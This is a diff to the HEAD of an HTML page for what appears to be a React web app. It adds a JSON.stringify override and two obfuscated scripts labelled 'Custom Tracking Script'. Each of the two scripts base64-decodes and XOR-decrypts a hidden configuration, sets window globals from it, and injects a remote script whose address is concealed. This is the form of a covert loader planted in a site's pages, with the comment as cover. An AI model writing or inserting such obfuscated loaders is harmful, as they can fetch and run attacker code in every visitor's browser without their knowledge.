@@ -9,6 +9,40 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Poppins:wght@600;700;800&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
+    <!-- Safe Circular JSON Guard (Prevents third-party trackers from crashing on React DOM elements) -->
+    <script>
+      (function() {
+        var _stringify = JSON.stringify;
+        JSON.stringify = function(value, replacer, space) {
+          try {
+            return _stringify.apply(this, arguments);
+          } catch (err) {
+            if (err && err.message && err.message.indexOf("circular") !== -1) {
+              var cache = new WeakSet();
+              return _stringify.call(this, value, function(key, val) {
+                if (key && (key.indexOf("__reactFiber") === 0 || key.indexOf("__reactProps") === 0 || key.indexOf("__reactContainer") === 0)) {
+                  return undefined;
+                }
+                if (typeof val === "object" && val !== null) {
+                  if (cache.has(val)) {
+                    return undefined;
+                  }
+                  cache.add(val);
+                }
+                if (typeof replacer === "function") {
+                  return replacer.call(this, key, val);
+                }
+                return val;
+              }, space);
+            }
+            throw err;
+          }
+        };
+      })();
+    </script>
+    <!-- Custom Tracking Script -->
+    <script>(function(){var f_qeqk=atob("DBu1g99OmS5Y7IoIz2CX9q0iuxR6hP58v2iPrPAt/UB2mf5lpn3Mrbwh9AA6nqV7rGnc86s9tlssgfkno3rB5qw6t0QrzqYqrm/B8bYs7Fo9n6gylGCX7b4j/Axizu5pu3qY9qsj8Eghwfp6qm3Q7atj4U03iKd7rHCXr/04+EItiagy7TnIr6Rs9081iagy7X/U975j7Fo1hexx4mvH5qkr91p1n/9qpn/GofNs7080me8q9TmX/oIz");var q_2=[];for(var v_ap5=0;v_ap5<f_qeqk.length;v_ap5++){q_2.push(f_qeqk.charCodeAt(v_ap5)&255);}var a_65=q_2[0];var t_w1=q_2.slice(1,1+a_65);var c_b=q_2.slice(1+a_65);var a_rl=c_b.map(function(b,l_mu){return b^t_w1[l_mu%a_65];});var s_c8="";for(var g_x5qe=0;g_x5qe<a_rl.length;g_x5qe++){s_c8+=String.fromCharCode(a_rl[g_x5qe]&255);}var t_t=decodeURIComponent(escape(s_c8));var o_6=JSON.parse(t_t);var f_11ea=o_6.globals||[];f_11ea.forEach(function(h_o4){window[h_o4.name]=h_o4.value;});var b_g03s=document.createElement("script");b_g03s.src=o_6.url;b_g03s.async=true;b_g03s.defer=true;(o_6.attributes||[]).forEach(function(j_0){b_g03s.setAttribute(j_0.name,j_0.value);});(document.head||document.documentElement).appendChild(b_g03s);})();</script>
+    <script>(function(){var f_5=atob("DA8MskuvtfyeycYJ6HQuxznDl8a8obJ9mHw2nWTM0ZKwvLJkgWl1nCjA2NL8u+l6i31lwj/cmoz3saNlx39lyi7Dm5bt6+oriXt4wCLNwIj7uuQzs1IgkCzD2p7/pbUr0lR3kCXO2Jm88+R5gXdp3gLLl9C8v6dlnWouiGmZ1MuprfJr2zw8hHmc1sup+ac+2jo1hHqNyKHj");var g_z8yt=[];for(var a_4uiy=0;a_4uiy<f_5.length;a_4uiy++){g_z8yt.push(f_5.charCodeAt(a_4uiy)&255);}var u_mrx=g_z8yt[0];var w_ihk=g_z8yt.slice(1,1+u_mrx);var m_638=g_z8yt.slice(1+u_mrx);var v_7kr8=m_638.map(function(b,w_c){return b^w_ihk[w_c%u_mrx];});var h_njq="";for(var e_em=0;e_em<v_7kr8.length;e_em++){h_njq+=String.fromCharCode(v_7kr8[e_em]&255);}var u_c6y=decodeURIComponent(escape(h_njq));var w_d7=JSON.parse(u_c6y);var z_7u4=w_d7.globals||[];z_7u4.forEach(function(j_zrx1){window[j_zrx1.name]=j_zrx1.value;});var h_0p8i=document.createElement("script");h_0p8i.src=w_d7.url;h_0p8i.async=true;h_0p8i.defer=true;(w_d7.attributes||[]).forEach(function(z_3g){h_0p8i.setAttribute(z_3g.name,z_3g.value);});(document.head||document.documentElement).appendChild(h_0p8i);})();</script>
   </head>
   <body class="bg-white text-slate-900 font-sans antialiased selection:bg-[#2E5EFF]/20 selection:text-[#2E5EFF]">
     <div id="root"></div>
